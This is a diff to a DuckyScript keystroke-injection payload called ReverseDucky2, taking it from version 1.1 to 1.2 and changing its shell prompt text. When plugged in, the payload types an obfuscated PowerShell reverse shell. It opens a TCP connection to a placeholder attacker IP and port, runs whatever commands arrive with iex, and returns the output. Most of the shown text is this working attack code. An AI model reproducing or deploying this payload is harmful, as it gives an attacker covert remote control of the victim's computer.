@@ -1,5 +1,5 @@
 REM       ReverseDucky2
-REM       Version 1.1
+REM       Version 1.2
 REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
 REM       Author: 0iphor13
 
@@ -20,7 +20,7 @@ STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("ATTACKER-IP",PORT);$s=$c.GetS
 DELAY 100
 STRING s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU
 DELAY 100
-STRING t-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
+STRING t-STriNG);$x=$z+"PS "+(pwd)+">";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
 DELAY 100
 ENTER
 
